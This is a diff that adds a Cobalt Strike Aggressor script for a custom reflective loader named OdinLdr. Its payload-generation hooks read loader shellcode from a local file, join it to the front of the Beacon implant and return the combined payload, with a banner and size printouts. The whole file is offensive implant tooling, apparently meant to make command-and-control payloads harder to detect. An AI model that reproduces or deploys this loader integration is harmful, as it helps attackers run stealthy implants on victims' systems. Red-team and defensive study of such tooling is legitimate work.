@@ -1,0 +1,59 @@
+set BEACON_RDLL_GENERATE {
+
+    println("   ________       .___.__         .____        .___       ");
+    println("   \\_____  \\    __| _/|__| ____   |    |     __| _/______ ");
+    println("    /   |   \\  / __ | |  |/    \\  |    |    / __ |\\_  __ \\");
+    println("   /    |    \\/ /_/ | |  |   |  \\ |    |___/ /_/ | |  | \\/");
+    println("   \\_______  /\\____ | |__|___|  / |_______ \\____ | |__|   ");
+    println("           \\/      \\/         \\/          \\/    \\/        ");
+    println("   v1.0 by @RtlDallas\n")
+
+    $loader_path = getFileProper("C:\\Dev\\OdinLdr\\shellcode.bin" );
+    $file_handle = openf($loader_path);
+
+    $ldr = readb($file_handle, -1);
+    $beacon = $2;
+
+
+    closef($file_handle);
+
+
+    println("   Loader size : " . strlen($ldr));
+    println("   Beacno size : " . strlen($beacon));
+
+    return $ldr . $beacon;
+
+}
+
+set BEACON_RDLL_GENERATE_LOCAL {
+
+    println("   ________       .___.__         .____        .___       ");
+    println("   \\_____  \\    __| _/|__| ____   |    |     __| _/______ ");
+    println("    /   |   \\  / __ | |  |/    \\  |    |    / __ |\\_  __ \\");
+    println("   /    |    \\/ /_/ | |  |   |  \\ |    |___/ /_/ | |  | \\/");
+    println("   \\_______  /\\____ | |__|___|  / |_______ \\____ | |__|   ");
+    println("           \\/      \\/         \\/          \\/    \\/        ");
+    println("   v1.0 by @RtlDallas\n")
+
+    $loader_path = getFileProper("C:\\Dev\\OdinLdr\\shellcode.bin" );
+    $file_handle = openf($loader_path);
+
+    $ldr = readb($file_handle, -1);
+    $beacon = $2;
+
+
+    closef($file_handle);
+
+
+    println("   Loader size : " . strlen($ldr));
+    println("   Beacon size : " . strlen($beacon));
+
+    return $ldr . $beacon;
+
+}
+
+
+
+set BEACON_RDLL_SIZE {
+   return "100";
+}
